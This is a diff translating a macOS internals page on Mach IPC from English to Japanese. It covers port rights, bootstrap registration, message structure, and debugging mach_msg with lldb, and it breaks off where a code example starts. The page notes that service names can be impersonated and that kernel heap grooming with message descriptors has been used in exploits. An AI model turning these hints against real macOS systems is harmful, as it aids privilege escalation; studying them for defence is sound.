@@ -4,101 +4,98 @@
 
 ## Mach messaging via Ports
 
-### Basic Information
+### 基本情報
 
-Mach uses **tasks** as the **smallest unit** for sharing resources, and each task can contain **multiple threads**. These **tasks and threads are mapped 1:1 to POSIX processes and threads**.
+Machはリソースを共有するための**最小単位**として**タスク**を使用し、各タスクは**複数のスレッド**を含むことができます。これらの**タスクとスレッドはPOSIXプロセスとスレッドに1:1でマッピングされます**。
 
-Communication between tasks occurs via Mach Inter-Process Communication (IPC), utilising one-way communication channels. **Messages are transferred between ports**, which act kind of **message queues** managed by the kernel.
+タスク間の通信はMach Inter-Process Communication (IPC)を介して行われ、一方向の通信チャネルを利用します。**メッセージはポート間で転送され**、これらはカーネルによって管理される**メッセージキュー**のようなものです。
 
-A **port** is the **basic** element of Mach IPC. It can be used to **send messages and to receive** them.
+**ポート**はMach IPCの**基本的な**要素です。メッセージを**送信し、受信する**ために使用できます。
 
-Each process has an **IPC table**, in there it's possible to find the **mach ports of the process**. The name of a mach port is actually a number (a pointer to the kernel object).
+各プロセスには**IPCテーブル**があり、そこには**プロセスのmachポート**を見つけることができます。machポートの名前は実際には番号（カーネルオブジェクトへのポインタ）です。
 
-A process can also send a port name with some rights **to a different task** and the kernel will make this entry in the **IPC table of the other task** appear.
+プロセスはまた、**異なるタスク**に権利を持つポート名を送信することができ、カーネルはこのエントリを**他のタスクのIPCテーブル**に表示させます。
 
-### Port Rights
+### ポート権限
 
-Port rights, which define what operations a task can perform, are key to this communication. The possible **port rights** are ([definitions from here](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):
+ポート権限は、タスクが実行できる操作を定義し、この通信の鍵となります。可能な**ポート権限**は以下の通りです（[ここからの定義](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)）：
 
-- **Receive right**, which allows receiving messages sent to the port. Mach ports are MPSC (multiple-producer, single-consumer) queues, which means that there may only ever be **one receive right for each port** in the whole system (unlike with pipes, where multiple processes can all hold file descriptors to the read end of one pipe).
-  - A **task with the Receive** right can receive messages and **create Send rights**, allowing it to send messages. Originally only the **own task has Receive right over its por**t.
-  - If the owner of the Receive right **dies** or kills it, the **send right became useless (dead name).**
-- **Send right**, which allows sending messages to the port.
-  - The Send right can be **cloned** so a task owning a Send right can clone the right and **grant it to a third task**.
-  - Note that **port rights** can also be **passed** though Mac messages.
-- **Send-once right**, which allows sending one message to the port and then disappears.
-  - This right **cannot** be **cloned**, but it can be **moved**.
-- **Port set right**, which denotes a _port set_ rather than a single port. Dequeuing a message from a port set dequeues a message from one of the ports it contains. Port sets can be used to listen on several ports simultaneously, a lot like `select`/`poll`/`epoll`/`kqueue` in Unix.
-- **Dead name**, which is not an actual port right, but merely a placeholder. When a port is destroyed, all existing port rights to the port turn into dead names.
+- **受信権限**は、ポートに送信されたメッセージを受信することを許可します。MachポートはMPSC（複数のプロデューサー、単一のコンシューマー）キューであり、システム全体で**各ポートに対して1つの受信権限**しか存在できません（パイプとは異なり、複数のプロセスが1つのパイプの読み取り端にファイルディスクリプタを保持できます）。
+- **受信権限を持つタスク**はメッセージを受信し、**送信権限を作成**することができ、メッセージを送信できます。元々は**自分のタスクのみがポートに対して受信権限を持っています**。
+- 受信権限の所有者が**死亡**するか、それを殺すと、**送信権限は無効になります（デッドネーム）。**
+- **送信権限**は、ポートにメッセージを送信することを許可します。
+- 送信権限は**クローン**可能で、送信権限を持つタスクはその権限をクローンし、**第三のタスクに付与**できます。
+- **ポート権限**はMacメッセージを介しても**渡すことができます**。
+- **一度だけの送信権限**は、ポートに1つのメッセージを送信し、その後消失します。
+- この権限は**クローン**できませんが、**移動**することができます。
+- **ポートセット権限**は、単一のポートではなく、_ポートセット_を示します。ポートセットからメッセージをデキューすると、その中のポートの1つからメッセージがデキューされます。ポートセットは、Unixの`select`/`poll`/`epoll`/`kqueue`のように、複数のポートを同時にリッスンするために使用できます。
+- **デッドネーム**は実際のポート権限ではなく、単なるプレースホルダーです。ポートが破壊されると、ポートへのすべての既存のポート権限はデッドネームに変わります。
 
-**Tasks can transfer SEND rights to others**, enabling them to send messages back. **SEND rights can also be cloned, so a task can duplicate and give the right to a third task**. This, combined with an intermediary process known as the **bootstrap server**, allows for effective communication between tasks.
+**タスクは他のタスクに送信権限を転送**でき、メッセージを返送することが可能になります。**送信権限はクローン可能で、タスクはその権限を複製して第三のタスクに与えることができます**。これにより、**ブートストラップサーバー**と呼ばれる仲介プロセスを組み合わせることで、タスク間の効果的な通信が可能になります。
 
-### File Ports
+### ファイルポート
 
-File ports allows to encapsulate file descriptors in Mac ports (using Mach port rights). It's possible to create a `fileport` from a given FD using `fileport_makeport` and create a FD froma. fileport using `fileport_makefd`.
+ファイルポートは、Macポート内にファイルディスクリプタをカプセル化することを可能にします（Machポート権限を使用）。`fileport_makeport`を使用して指定されたFDから`fileport`を作成し、`fileport_makefd`を使用してファイルポートからFDを作成することができます。
 
-### Establishing a communication
+### 通信の確立
 
-As mentioned previously, it's possible to send rights using Mach messages, however, you **cannot send a right without already having a right** to send a Mach message. So, how is the first communication stablished?
+前述のように、Machメッセージを使用して権限を送信することは可能ですが、**Machメッセージを送信する権限を持っていないと権限を送信することはできません**。では、最初の通信はどのように確立されるのでしょうか？
 
-For this, he **bootstrap server** (**launchd** in mac) is involved, as **everyone can get a SEND right to the bootstrap server**, it's possible to ask it for a right to send a message to another process:
+これには、**ブートストラップサーバー**（macでは**launchd**）が関与します。**誰でもブートストラップサーバーに送信権限を取得できるため**、他のプロセスにメッセージを送信する権限を要求することが可能です：
 
-1. Task **A** creates a **new port**, getting the **RECEIVE right** over it.
-2. Task **A**, being the holder of the RECEIVE right, **generates a SEND right for the port**.
-3. Task **A** establishes a **connection** with the **bootstrap server**, and **sends it the SEND right** for the port it generated at the beginning.
-   - Remember that anyone can get a SEND right to the bootstrap server.
-4. Task A sends a `bootstrap_register` message to the bootstrap server to **associate the given port with a name** like `com.apple.taska`
-5. Task **B** interacts with the **bootstrap server** to execute a bootstrap **lookup for the service** name (`bootstrap_lookup`). So the bootstrap server can respond, task B will send it a **SEND right to a port it previously created** inside the lookup message. If the lookup is successful, the **server duplicates the SEND right** received from Task A and **transmits it to Task B**.
-   - Remember that anyone can get a SEND right to the bootstrap server.
-6. With this SEND right, **Task B** is capable of **sending** a **message** **to Task A**.
-7. For a bi-directional communication usually task **B** generates a new port with a **RECEIVE** right and a **SEND** right, and gives the **SEND right to Task A** so it can send messages to TASK B (bi-directional communication).
+1. タスク**A**が**新しいポート**を作成し、その上で**受信権限**を取得します。
+2. タスク**A**は、受信権限の保持者として、**ポートの送信権限を生成**します。
+3. タスク**A**は**ブートストラップサーバー**との**接続**を確立し、最初に生成したポートの**送信権限を送信**します。
+- 誰でもブートストラップサーバーに送信権限を取得できることを忘れないでください。
+4. タスクAは、ブートストラップサーバーに`bootstrap_register`メッセージを送信して、**指定されたポートに名前を関連付けます**（例：`com.apple.taska`）。
+5. タスク**B**は、ブートストラップサーバーと対話してサービス名のブートストラップ**ルックアップ**を実行します（`bootstrap_lookup`）。ブートストラップサーバーが応答できるように、タスクBはルックアップメッセージ内で**以前に作成したポートへの送信権限**を送信します。ルックアップが成功すると、**サーバーはタスクAから受け取った送信権限を複製し、タスクBに**転送します。
+- 誰でもブートストラップサーバーに送信権限を取得できることを忘れないでください。
+6. この送信権限を持って、**タスクB**は**タスクAにメッセージを送信**することができます。
+7. 双方向通信のために、通常タスク**B**は**受信**権限と**送信**権限を持つ新しいポートを生成し、タスクAに**送信権限を与えて**タスクBにメッセージを送信できるようにします（双方向通信）。
 
-The bootstrap server **cannot authenticate** the service name claimed by a task. This means a **task** could potentially **impersonate any system task**, such as falsely **claiming an authorization service name** and then approving every request.
+ブートストラップサーバーは、タスクが主張するサービス名を**認証できません**。これは、**タスク**が任意のシステムタスクを**偽装する可能性がある**ことを意味します。たとえば、偽の**認証サービス名を主張し、すべてのリクエストを承認する**ことができます。
 
-Then, Apple stores the **names of system-provided services** in secure configuration files, located in **SIP-protected** directories: `/System/Library/LaunchDaemons` and `/System/Library/LaunchAgents`. Alongside each service name, the **associated binary is also stored**. The bootstrap server, will create and hold a **RECEIVE right for each of these service names**.
+その後、Appleは**システム提供サービスの名前**を安全な構成ファイルに保存し、**SIP保護された**ディレクトリに配置します：`/System/Library/LaunchDaemons`および`/System/Library/LaunchAgents`。各サービス名に関連付けられた**バイナリも保存されます**。ブートストラップサーバーは、これらのサービス名の**受信権限を作成し保持します**。
 
-For these predefined services, the **lookup process differs slightly**. When a service name is being looked up, launchd starts the service dynamically. The new workflow is as follows:
+これらの事前定義されたサービスについては、**ルックアッププロセスがわずかに異なります**。サービス名がルックアップされると、launchdはサービスを動的に開始します。新しいワークフローは次のようになります：
 
-- Task **B** initiates a bootstrap **lookup** for a service name.
-- **launchd** checks if the task is running and if it isn’t, **starts** it.
-- Task **A** (the service) performs a **bootstrap check-in** (`bootstrap_check_in()`). Here, the **bootstrap** server creates a SEND right, retains it, and **transfers the RECEIVE right to Task A**.
-- launchd duplicates the **SEND right and sends it to Task B**.
-- Task **B** generates a new port with a **RECEIVE** right and a **SEND** right, and gives the **SEND right to Task A** (the svc) so it can send messages to TASK B (bi-directional communication).
+- タスク**B**がサービス名のブートストラップ**ルックアップ**を開始します。
+- **launchd**はタスクが実行中かどうかを確認し、実行されていない場合は**開始**します。
+- タスク**A**（サービス）は**ブートストラップチェックイン**（`bootstrap_check_in()`）を実行します。ここで、**ブートストラップ**サーバーは送信権限を作成し、それを保持し、**受信権限をタスクAに転送します**。
+- launchdは**送信権限を複製し、タスクBに送信します**。
+- タスク**B**は**受信**権限と**送信**権限を持つ新しいポートを生成し、タスクA（svc）に**送信権限を与えて**タスクBにメッセージを送信できるようにします（双方向通信）。
 
-However, this process only applies to predefined system tasks. Non-system tasks still operate as described originally, which could potentially allow for impersonation.
+ただし、このプロセスは事前定義されたシステムタスクにのみ適用されます。非システムタスクは元の説明のように動作し続け、偽装を許可する可能性があります。
 
 > [!CAUTION]
-> Therefore, launchd should never crash or the whole sysem will crash.
+> したがって、launchdは決してクラッシュしてはいけません。そうでないと、システム全体がクラッシュします。
 
-### A Mach Message
+### Machメッセージ
 
-[Find more info here](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
+[こちらで詳細情報を見つけてください](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
 
-The `mach_msg` function, essentially a system call, is utilized for sending and receiving Mach messages. The function requires the message to be sent as the initial argument. This message must commence with a `mach_msg_header_t` structure, succeeded by the actual message content. The structure is defined as follows:
-
+`mach_msg`関数は、実質的にシステムコールであり、Machメッセージの送信と受信に使用されます。この関数は、最初の引数として送信されるメッセージを必要とします。このメッセージは、`mach_msg_header_t`構造体で始まり、その後に実際のメッセージ内容が続きます。この構造体は次のように定義されています：
 ```c
 typedef struct {
-	mach_msg_bits_t               msgh_bits;
-	mach_msg_size_t               msgh_size;
-	mach_port_t                   msgh_remote_port;
-	mach_port_t                   msgh_local_port;
-	mach_port_name_t              msgh_voucher_port;
-	mach_msg_id_t                 msgh_id;
+mach_msg_bits_t               msgh_bits;
+mach_msg_size_t               msgh_size;
+mach_port_t                   msgh_remote_port;
+mach_port_t                   msgh_local_port;
+mach_port_name_t              msgh_voucher_port;
+mach_msg_id_t                 msgh_id;
 } mach_msg_header_t;
 ```
+プロセスが _**受信権**_ を持っている場合、Machポートでメッセージを受信できます。逆に、**送信者**には _**送信**_ または _**一度だけ送信権**_ が付与されます。一度だけ送信権は、単一のメッセージを送信するためのもので、その後は無効になります。
 
-Processes possessing a _**receive right**_ can receive messages on a Mach port. Conversely, the **senders** are granted a _**send**_ or a _**send-once right**_. The send-once right is exclusively for sending a single message, after which it becomes invalid.
+初期フィールド **`msgh_bits`** はビットマップです：
 
-The initial field **`msgh_bits`** is a bitmap:
+- 最初のビット（最も重要なビット）は、メッセージが複雑であることを示すために使用されます（詳細は以下）。
+- 3番目と4番目はカーネルによって使用されます。
+- 2バイト目の **5つの最下位ビット** は **バウチャー** に使用できます：キー/値の組み合わせを送信するための別のタイプのポートです。
+- 3バイト目の **5つの最下位ビット** は **ローカルポート** に使用できます。
+- 4バイト目の **5つの最下位ビット** は **リモートポート** に使用できます。
 
-- First bit (most significative) is used to indicate that a message is complex (more on this below)
-- The 3rd and 4th are used by the kernel
-- The **5 least significant bits of the 2nd byte** from can be used for **voucher**: another type of port to send key/value combinations.
-- The **5 least significant bits of the 3rd byte** from can be used for **local port**
-- The **5 least significant bits of the 4th byte** from can be used for **remote port**
-
-The types that can be specified in the voucher, local and remote ports are (from [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
-
+バウチャー、ローカルポート、リモートポートで指定できるタイプは次のとおりです（[**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html) から）：
 ```c
 #define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
 #define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
@@ -111,34 +108,32 @@ The types that can be specified in the voucher, local and remote ports are (from
 #define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
 #define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
 ```
+例えば、`MACH_MSG_TYPE_MAKE_SEND_ONCE`は、このポートのために**送信一次権利**を導出し、転送することを**示す**ために使用できます。また、受信者が返信できないようにするために`MACH_PORT_NULL`を指定することもできます。
 
-For example, `MACH_MSG_TYPE_MAKE_SEND_ONCE` can be used to **indicate** that a **send-once** **right** should be derived and transferred for this port. It can also be specified `MACH_PORT_NULL` to prevent the recipient to be able to reply.
-
-In order to achieve an easy **bi-directional communication** a process can specify a **mach port** in the mach **message header** called the _reply port_ (**`msgh_local_port`**) where the **receiver** of the message can **send a reply** to this message.
+簡単な**双方向通信**を実現するために、プロセスは**返信ポート**（**`msgh_local_port`**）と呼ばれるmach **メッセージヘッダー**内の**machポート**を指定することができ、メッセージの**受信者**はこのメッセージに**返信**を送信できます。
 
 > [!TIP]
-> Note that this kind of bi-directional communication is used in XPC messages that expect a replay (`xpc_connection_send_message_with_reply` and `xpc_connection_send_message_with_reply_sync`). But **usually different ports are created** as explained previously to create the bi-directional communication.
+> この種の双方向通信は、再生を期待するXPCメッセージ（`xpc_connection_send_message_with_reply`および`xpc_connection_send_message_with_reply_sync`）で使用されることに注意してください。しかし、**通常は異なるポートが作成され**、前述のように双方向通信を作成します。
 
-The other fields of the message header are:
+メッセージヘッダーの他のフィールドは次のとおりです：
 
-- `msgh_size`: the size of the entire packet.
-- `msgh_remote_port`: the port on which this message is sent.
-- `msgh_voucher_port`: [mach vouchers](https://robert.sesek.com/2023/6/mach_vouchers.html).
-- `msgh_id`: the ID of this message, which is interpreted by the receiver.
+- `msgh_size`: パケット全体のサイズ。
+- `msgh_remote_port`: このメッセージが送信されるポート。
+- `msgh_voucher_port`: [machバウチャー](https://robert.sesek.com/2023/6/mach_vouchers.html)。
+- `msgh_id`: このメッセージのIDで、受信者によって解釈されます。
 
 > [!CAUTION]
-> Note that **mach messages are sent over a `mach port`**, which is a **single receiver**, **multiple sender** communication channel built into the mach kernel. **Multiple processes** can **send messages** to a mach port, but at any point only **a single process can read** from it.
+> **machメッセージは`machポート`を介して送信される**ことに注意してください。これは**単一受信者**、**複数送信者**の通信チャネルで、machカーネルに組み込まれています。**複数のプロセス**がmachポートに**メッセージを送信**できますが、いつでも**単一のプロセスのみが**そこから読み取ることができます。
 
-Messages are then formed by the **`mach_msg_header_t`** header followed by the **body** and by the **trailer** (if any) and it can grant permission to reply to it. In these cases, the kernel just need to pass the message from one task to the other.
+メッセージは、**`mach_msg_header_t`**ヘッダーの後に**本体**、および**トレーラー**（ある場合）で構成され、返信の許可を与えることができます。この場合、カーネルはメッセージを一つのタスクから別のタスクに渡すだけで済みます。
 
-A **trailer** is **information added to the message by the kernel** (cannot be set by the user) which can be requested in message reception with the flags `MACH_RCV_TRAILER_<trailer_opt>` (there is different information that can be requested).
+**トレーラー**は、カーネルによってメッセージに**追加される情報**（ユーザーによって設定できない）で、フラグ`MACH_RCV_TRAILER_<trailer_opt>`を使用してメッセージ受信時に要求できます（要求できる情報は異なります）。
 
-#### Complex Messages
+#### 複雑なメッセージ
 
-However, there are other more **complex** messages, like the ones passing additional port rights or sharing memory, where the kernel also needs to send these objects to the recipient. In this cases the most significant bit of the header `msgh_bits` is set.
+ただし、追加のポート権を渡したり、メモリを共有したりするような、より**複雑な**メッセージもあります。この場合、カーネルはこれらのオブジェクトを受信者に送信する必要があります。この場合、ヘッダーの最上位ビット`msgh_bits`が設定されます。
 
-The possible descriptors to pass are defined in [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html):
-
+渡す可能な記述子は、[**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)で定義されています：
 ```c
 #define MACH_MSG_PORT_DESCRIPTOR                0
 #define MACH_MSG_OOL_DESCRIPTOR                 1
@@ -149,40 +144,39 @@ The possible descriptors to pass are defined in [**`mach/message.h`**](https://o
 #pragma pack(push, 4)
 
 typedef struct{
-	natural_t                     pad1;
-	mach_msg_size_t               pad2;
-	unsigned int                  pad3 : 24;
-	mach_msg_descriptor_type_t    type : 8;
+natural_t                     pad1;
+mach_msg_size_t               pad2;
+unsigned int                  pad3 : 24;
+mach_msg_descriptor_type_t    type : 8;
 } mach_msg_type_descriptor_t;
 ```
-
-In 32bits, all the descriptors are 12B and the descriptor type is in the 11th one. In 64 bits, the sizes vary.
+In 32ビットでは、すべてのディスクリプタは12Bで、ディスクリプタタイプは11番目にあります。64ビットでは、サイズが異なります。
 
 > [!CAUTION]
-> The kernel will copy the descriptors from one task to the other but first **creating a copy in kernel memory**. This technique, known as "Feng Shui" has been abused in several exploits to make the **kernel copy data in its memory** making a process send descriptors to itself. Then the process can receive the messages (the kernel will free them).
+> カーネルは、あるタスクから別のタスクにディスクリプタをコピーしますが、最初に**カーネルメモリにコピーを作成します**。この技術は「風水」として知られ、いくつかのエクスプロイトで悪用され、**カーネルがそのメモリにデータをコピーする**ことを可能にし、プロセスが自分自身にディスクリプタを送信します。その後、プロセスはメッセージを受信できます（カーネルがそれらを解放します）。
 >
-> It's also possible to **send port rights to a vulnerable process**, and the port rights will just appear in the process (even if he isn't handling them).
+> また、**脆弱なプロセスにポート権を送信する**ことも可能で、ポート権はプロセスに表示されます（たとえそのプロセスがそれらを処理していなくても）。
 
 ### Mac Ports APIs
 
-Note that ports are associated to the task namespace, so to create or search for a port, the task namespace is also queried (more in `mach/mach_port.h`):
+ポートはタスクネームスペースに関連付けられているため、ポートを作成または検索するには、タスクネームスペースもクエリされます（`mach/mach_port.h`の詳細）：
 
-- **`mach_port_allocate` | `mach_port_construct`**: **Create** a port.
-  - `mach_port_allocate` can also create a **port set**: receive right over a group of ports. Whenever a message is received it's indicated the port from where it was.
-- `mach_port_allocate_name`: Change the name of the port (by default 32bit integer)
-- `mach_port_names`: Get port names from a target
-- `mach_port_type`: Get rights of a task over a name
-- `mach_port_rename`: Rename a port (like dup2 for FDs)
-- `mach_port_allocate`: Allocate a new RECEIVE, PORT_SET or DEAD_NAME
-- `mach_port_insert_right`: Create a new right in a port where you have RECEIVE
+- **`mach_port_allocate` | `mach_port_construct`**: **ポートを作成**します。
+- `mach_port_allocate`は**ポートセット**も作成できます：ポートのグループに対する受信権。メッセージが受信されると、どのポートから受信されたかが示されます。
+- `mach_port_allocate_name`: ポートの名前を変更します（デフォルトは32ビット整数）。
+- `mach_port_names`: ターゲットからポート名を取得します。
+- `mach_port_type`: 名前に対するタスクの権利を取得します。
+- `mach_port_rename`: ポートの名前を変更します（FDのdup2のように）。
+- `mach_port_allocate`: 新しいRECEIVE、PORT_SETまたはDEAD_NAMEを割り当てます。
+- `mach_port_insert_right`: RECEIVEを持つポートに新しい権利を作成します。
 - `mach_port_...`
-- **`mach_msg`** | **`mach_msg_overwrite`**: Functions used to **send and receive mach messages**. The overwrite version allows to specify a different buffer for message reception (the other version will just reuse it).
+- **`mach_msg`** | **`mach_msg_overwrite`**: **machメッセージを送受信するために使用される関数**。上書きバージョンでは、メッセージ受信のために異なるバッファを指定できます（他のバージョンはそれを再利用します）。
 
 ### Debug mach_msg
 
-As the functions **`mach_msg`** and **`mach_msg_overwrite`** are the ones used to send a receive messages, setting a breakpoint on them would allow to inspect the sent a received messages.
+**`mach_msg`**および**`mach_msg_overwrite`**関数はメッセージを送受信するために使用されるため、これらにブレークポイントを設定すると、送信されたメッセージと受信されたメッセージを検査できます。
 
-For example start debugging any application you can debug as it will load **`libSystem.B` which will use this function**.
+たとえば、デバッグ可能な任意のアプリケーションのデバッグを開始すると、**`libSystem.B`がロードされ、この関数を使用します**。
 
 <pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
 </strong>Breakpoint 1: where = libsystem_kernel.dylib`mach_msg, address = 0x00000001803f6c20
@@ -190,56 +184,51 @@ For example start debugging any application you can debug as it will load **`lib
 </strong>Process 71019 launched: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
 Process 71019 stopped
 * thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
-    frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
+frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
 libsystem_kernel.dylib`mach_msg:
 ->  0x181d3ac20 &#x3C;+0>:  pacibsp
-    0x181d3ac24 &#x3C;+4>:  sub    sp, sp, #0x20
-    0x181d3ac28 &#x3C;+8>:  stp    x29, x30, [sp, #0x10]
-    0x181d3ac2c &#x3C;+12>: add    x29, sp, #0x10
+0x181d3ac24 &#x3C;+4>:  sub    sp, sp, #0x20
+0x181d3ac28 &#x3C;+8>:  stp    x29, x30, [sp, #0x10]
+0x181d3ac2c &#x3C;+12>: add    x29, sp, #0x10
 Target 0: (SandboxedShellApp) stopped.
 <strong>(lldb) bt
 </strong>* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
-  * frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
-    frame #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
-    frame #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
-    frame #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
-    frame #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
-    frame #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
-    frame #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
-    frame #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
-    frame #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
-    frame #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&#x26;) const::$_0::operator()() const + 168
+* frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
+frame #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
+frame #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
+frame #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
+frame #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
+frame #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
+frame #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
+frame #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
+frame #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
+frame #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&#x26;) const::$_0::operator()() const + 168
 </code></pre>
 
-To get the arguments of **`mach_msg`** check the registers. These are the arguments (from [mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
-
+**`mach_msg`**の引数を取得するには、レジスタを確認します。これらが引数です（[mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)から）：
 ```c
 __WATCHOS_PROHIBITED __TVOS_PROHIBITED
 extern mach_msg_return_t        mach_msg(
-	mach_msg_header_t *msg,
-	mach_msg_option_t option,
-	mach_msg_size_t send_size,
-	mach_msg_size_t rcv_size,
-	mach_port_name_t rcv_name,
-	mach_msg_timeout_t timeout,
-	mach_port_name_t notify);
+mach_msg_header_t *msg,
+mach_msg_option_t option,
+mach_msg_size_t send_size,
+mach_msg_size_t rcv_size,
+mach_port_name_t rcv_name,
+mach_msg_timeout_t timeout,
+mach_port_name_t notify);
 ```
-
-Get the values from the registries:
-
+レジストリから値を取得します:
 ```armasm
 reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
-      x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
-      x1 = 0x0000000003114207 ;mach_msg_option_t (option)
-      x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
-      x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
-      x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
-      x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
-      x6 = 0x0000000000000000 ;mach_port_name_t (notify)
+x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
+x1 = 0x0000000003114207 ;mach_msg_option_t (option)
+x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
+x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
+x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
+x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
+x6 = 0x0000000000000000 ;mach_port_name_t (notify)
 ```
-
-Inspect the message header checking the first argument:
-
+メッセージヘッダーを検査し、最初の引数を確認します:
 ```armasm
 (lldb) x/6w $x0
 0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
@@ -252,17 +241,15 @@ Inspect the message header checking the first argument:
 ; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
 ; 0x40000322 -> mach_msg_id_t (msgh_id)
 ```
+そのタイプの `mach_msg_bits_t` は、応答を許可するために非常に一般的です。
 
-That type of `mach_msg_bits_t` is very common to allow a reply.
-
-### Enumerate ports
-
+### ポートの列挙
 ```bash
 lsmp -p <pid>
 
 sudo lsmp -p 1
 Process (1) : launchd
-  name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
+name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
 ---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
 0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
 0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
@@ -276,30 +263,26 @@ Process (1) : launchd
 0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
 [...]
 0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
-                  +     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
-                  +     send        --------        ---            1         <-                                       0x00002603  (74295) passd
-                  [...]
++     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
++     send        --------        ---            1         <-                                       0x00002603  (74295) passd
+[...]
 ```
+**名前**はポートに与えられたデフォルトの名前です（最初の3バイトでどのように**増加**しているかを確認してください）。**`ipc-object`**はポートの**難読化された**一意の**識別子**です。\
+また、**`send`**権限のみを持つポートがその所有者（ポート名 + pid）を**識別している**ことにも注意してください。\
+さらに、**`+`**を使用して**同じポートに接続された他のタスク**を示していることにも注意してください。
 
-The **name** is the default name given to the port (check how it's **increasing** in the first 3 bytes). The **`ipc-object`** is the **obfuscated** unique **identifier** of the port.\
-Note also how the ports with only **`send`** right are **identifying the owner** of it (port name + pid).\
-Also note the use of **`+`** to indicate **other tasks connected to the same port**.
-
-It's also possible to use [**procesxp**](https://www.newosxbook.com/tools/procexp.html) to see also the **registered service names** (with SIP disabled due to the need of `com.apple.system-task-port`):
-
+また、[**procesxp**](https://www.newosxbook.com/tools/procexp.html)を使用して、**登録されたサービス名**（`com.apple.system-task-port`の必要性によりSIPが無効になっている場合）も確認できます。
 ```
 procesp 1 ports
 ```
+このツールは、[http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz) からダウンロードしてiOSにインストールできます。
 
-You can install this tool in iOS downloading it from [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)
+### コード例
 
-### Code example
-
-Note how the **sender** **allocates** a port, create a **send right** for the name `org.darlinghq.example` and send it to the **bootstrap server** while the sender asked for the **send right** of that name and used it to **send a message**.
+**送信者**がポートを**割り当て**、名前 `org.darlinghq.example` のための**送信権**を作成し、それを**ブートストラップサーバー**に送信する様子に注意してください。送信者はその名前の**送信権**を要求し、それを使用して**メッセージを送信**しました。
 
 {{#tabs}}
 {{#tab name="receiver.c"}}
-
 ```c
 // Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
 // gcc receiver.c -o receiver
@@ -310,66 +293,64 @@ Note how the **sender** **allocates** a port, create a **send right** for the na
 
 int main() {
